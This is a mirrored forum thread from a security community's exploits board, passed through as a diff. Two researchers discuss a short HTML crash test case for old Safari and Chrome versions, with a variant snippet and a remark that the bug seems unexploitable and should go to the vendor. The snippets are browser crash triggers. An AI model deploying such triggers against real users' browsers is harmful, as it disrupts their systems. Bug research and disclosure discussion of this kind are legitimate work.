@@ -1,0 +1,1415 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=4895&p=11859 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:33:54 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." />
+<meta property="og:url" content="showthread1123.html?t=4895" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "showthread";
+	var RELPATH = "showthreadd840.html?t=4895&amp;p=11859";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Garage4hackers Exploits - RSS Feed" href="external7e64.php?type=RSS2&amp;forumids=43" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	<meta name="keywords" content="chrome crash, chrome vulnerability, safari crash, safari vulnerability, webkit crash, webkit vulnerability, 00000001, 00000000, 02e9f4fc, 02e9f010, eax,dword, 02e9f1d0, 02e9f400, 02e9f318, 02e9f384, esi,dword, chrome_630c0000ovly_debug_event+0x167946, 63288d39, 6328776c, chrome_630c0000ovly_debug_event+0x1678c9, 632842ac, chrome_630c0000ovly_debug_event+0x1a7957, chrome_630c0000ovly_debug_event+0x1a4ac3, chrome_630c0000ovly_debug_event+0x1a4497, 632848d8, 632476de, 8b400c, exception, block, 6324775b, chrome_630c0000ovly_debug_event+0x1a8f24, [eax+0ch], 01cd8000, chance, [esi+18h], 8b4618, [esp+10h], 8b742410, chrome, symbols, display, edx,dword, 63247683, 0024e908, 0024e828, 63253488, 0024e7b0, 0024e970, wrong, 0024e9dc" />
+	<meta name="description" content="Following code is for Safari 5.1.7 (7534.57.2) and Chrome 26.0.1410.64m  
+ 
+ 
+&lt;html&gt;&lt;body&gt; 
+ 
+&lt;li&gt; 
+&lt;ruby style=&quot;display: block;&quot;&gt; 
+&lt;t:IMG id=&quot;tim&quot;&gt;&lt;/t:IMG&gt; 
+&lt;/ruby&gt;&lt;/li&gt;" />
+
+	<title> Safari 5.1.7 (7534.57.2) and Chrome 26.0.1410.64m</title>
+	<link rel="canonical" href="showthread1123.html?t=4895" />
+	
+	<script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	
+	
+	
+	
+	
+	
+
+	
+		<link rel="stylesheet" type="text/css" href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" />
+	
+
+<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+
+<body>
+
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
+						
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_community">
+							<a href="javascript://" class="popupctrl">Community</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_actions">
+							<a href="javascript://" class="popupctrl">Forum Actions</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_qlinks">
+							<a href="javascript://" class="popupctrl">Quick Links</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
+								
+									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
+								
+							</ul>
+						</li>
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="forum.html">Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+
+		
+	<li class="navbit lastnavbit"><span> Safari 5.1.7 (7534.57.2) and Chrome 26.0.1410.64m</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=4895&p=11859 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:33:54 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+
+
+	<div id="above_postlist" class="above_postlist">
+		
+
+		<div id="pagination_top" class="pagination_top">
+		
+			<div id="postpagestats_above" class="postpagestats">
+				Results 1 to 6 of 6
+			</div>
+		</div>
+	</div>
+<div id="pagetitle" class="pagetitle">
+	<h1>
+		Thread: <span class="threadtitle"><a href="showthread1123.html?t=4895" title="Reload this Page">Safari 5.1.7 (7534.57.2) and Chrome 26.0.1410.64m</a></span>
+
+<a class="a2a_dd" href="../external.html?link=http://www.addtoany.com/share_save"><img src="../static.addtoany.com/buttons/share_save_171_16.png" width="171" height="16" border="0" alt="Share/Save - My123World.Com!"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script type="text/javascript" src="../static.addtoany.com/menu/page.js"></script>
+
+		
+			
+<fb:like href="showthread1123.html?t=4895" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+	</h1>
+</div>
+	<div id="thread_controls" class="thread_controls">
+		<div>
+		<ul id="postlist_popups" class="postlist_popups popupgroup">
+			
+			<li class="popupmenu" id="threadtools">
+				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
+				<ul class="popupbody popuphover">
+					<li><a href="printthread4b88.html?t=4895&amp;pp=10&amp;page=1" accesskey="3" 
+						rel="nofollow">Show Printable Version</a></li>
+					<li><a href="sendmessage6dd1.html?do=sendtofriend&amp;t=4895"
+						rel="nofollow">Email this Page&hellip;</a></li>
+					<li>
+						
+							<a href="subscription80c6.html?do=addsubscription&amp;t=4895" 
+								rel="nofollow">Subscribe to this Thread&hellip;</a>
+											
+					</li>
+					
+				</ul>
+			</li>
+
+			
+
+			
+				<li class="popupmenu searchthread" id="searchthread">
+					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
+					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
+						<ul class="popupbody popuphover">
+							<li>
+								<input type="text" name="query" class="searchbox" value="Search..." tabindex="13" />
+								<input type="submit" class="button" value="Search" tabindex="14" />
+							</li>
+							<li class="formsubmit">
+								<div><a class="advancedsearchlink" href="search7c11.html?search_type=1&amp;searchthreadid=4895&amp;contenttype=vBForum_Post">Advanced Search</a></div>
+							</li>
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="process" />
+						<input type="hidden" name="searchthreadid" value="4895" />
+						<input type="hidden" name="search_type" value="1" />
+						<input type="hidden" name="contenttype" value="vBForum_Post" />
+
+					</form>
+				</li>
+			
+
+			
+
+			
+				<li class="popupmenu" id="displaymodes">
+					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
+					<ul class="popupbody popuphover">
+						<li><a href="showthreadcf74.html?t=4895&amp;p=11859&amp;mode=linear#post11859"> Switch to Linear Mode</a></li>
+						<li><a href="showthread85aa.html?t=4895&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
+						<li><label>Threaded Mode</label></li>
+					</ul>
+				</li>
+			
+
+			
+		</ul>
+		</div>
+	</div>
+
+<div id="postlist" class="postlist restrain">
+	
+		<script type="text/javascript">
+<!--
+var imgdir_statusicon = "images/statusicon";
+var imgdir_misc = "images/misc";
+var cleargifurl = "clear.gif";
+var guestphrase = "Guest";
+var morephrase = "More replies below current depth...";
+var highlightwords = "";
+//-->
+</script>
+
+<script type="text/javascript" src="clientscript/vbulletin_thrdpostlist6719.html?v=421"></script>
+
+<script type="text/javascript">
+<!--
+// initialize some variables
+var curpostid = 11859;
+var quickreply = false;
+
+// cached posts (no page reload required to view)
+pd[11858] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_11858">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-07-2013,&nbsp;<span class="time">11:08 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post11858" href="showthread.php?t=4895&amp;p=11858&amp;viewfull=1#post11858" class="postcounter">#1</a><a id="postcount11858" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=61" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=61" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="&quot;vinnu&quot; is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_11858_61" title="&quot;vinnu&quot; is a jewel in the rough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=61" title="&quot;vinnu&quot; is offline">\r\n				<img src="image.php?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;\'s Avatar" title="&quot;vinnu&quot;\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>271</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=61">4</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					<img src="images/icons/icon11.png" alt="Red face" /> Safari 5.1.7 (7534.57.2) and Chrome 26.0.1410.64m\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_11858">\r\n						<blockquote class="postcontent restore ">\r\n							Following code is for Safari 5.1.7 (7534.57.2) and Chrome 26.0.1410.64m <br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:120px;">&lt;html&gt;&lt;body&gt;\n\n&lt;li&gt;\n&lt;ruby style=&quot;display: block;&quot;&gt;\n&lt;t:IMG id=&quot;tim&quot;&gt;&lt;/t:IMG&gt;\n&lt;/ruby&gt;&lt;/li&gt;\n\n&lt;/body&gt;&lt;/html&gt;</pre>\r\n</div>...&quot;vinnu&quot;\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				<!-' + '- edit note -' + '->\r\n				<blockquote class="postcontent lastedited">\r\n					\r\n						Last edited by &quot;vinnu&quot;; 06-07-2013 at <span class="time">12:04 PM</span>.\r\n					\r\n					\r\n				</blockquote>\r\n				<!-' + '- / edit note -' + '->\r\n				\r\n				\r\n				\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_11858" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_11858" class="newreply" href="newreply.php?do=newreply&amp;p=11858" rel="nofollow" title="Reply With Quote"><img id="quoteimg_11858" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[11859] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_11859">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-07-2013,&nbsp;<span class="time">01:34 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post11859" href="showthread.php?t=4895&amp;p=11859&amp;viewfull=1#post11859" class="postcounter">#2</a><a id="postcount11859" name="2"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_11859_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_11859">\r\n						<blockquote class="postcontent restore ">\r\n							I had some issues resolving chrome symbols, so cdnt do proper analysis.But I dont think there is a possibility of making it exploitable. You should report to vendor and wait a longer time :P before public disclosure <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" /> :P .  <br />\n<br />\nThe villan is &quot; display: block;&quot; for ruby tag.<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">PHP Code:</div>\r\n	<div class="bbcode_code"style="height:240px;"><code><code><span style="color: #000000">\n<span style="color: #0000BB"></span><span style="color: #007700">&lt;</span><span style="color: #0000BB">html</span><span style="color: #007700">&gt;<br />&lt;</span><span style="color: #0000BB">body</span><span style="color: #007700">&gt;<br /><br /><br />&lt;</span><span style="color: #0000BB">li</span><span style="color: #007700">&gt;<br /><br />&lt;</span><span style="color: #0000BB">ruby&nbsp;style</span><span style="color: #007700">=</span><span style="color: #DD0000">"display:&nbsp;block;"&nbsp;</span><span style="color: #007700">&gt;<br /><br /><br /><br />&lt;</span><span style="color: #0000BB">p&nbsp;</span><span style="color: #007700">&gt;</span><span style="color: #0000BB">I&nbsp;am&nbsp;fucked&nbsp;</span><span style="color: #007700">:|&nbsp;</span><span style="color: #0000BB">by&nbsp;style&nbsp;display&nbsp;</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">block</span><span style="color: #007700">&lt;/</span><span style="color: #0000BB">p</span><span style="color: #007700">&gt;<br /><br />&lt;/</span><span style="color: #0000BB">ruby</span><span style="color: #007700">&gt;<br />&lt;/</span><span style="color: #0000BB">li</span><span style="color: #007700">&gt;<br /><br /><br />&lt;/</span><span style="color: #0000BB">body</span><span style="color: #007700">&gt;<br />&lt;/</span><span style="color: #0000BB">html</span><span style="color: #007700">&gt;&nbsp;\r<br /></span><span style="color: #0000BB"></span>\n</span>\n</code></code></div>\r\n</div><br 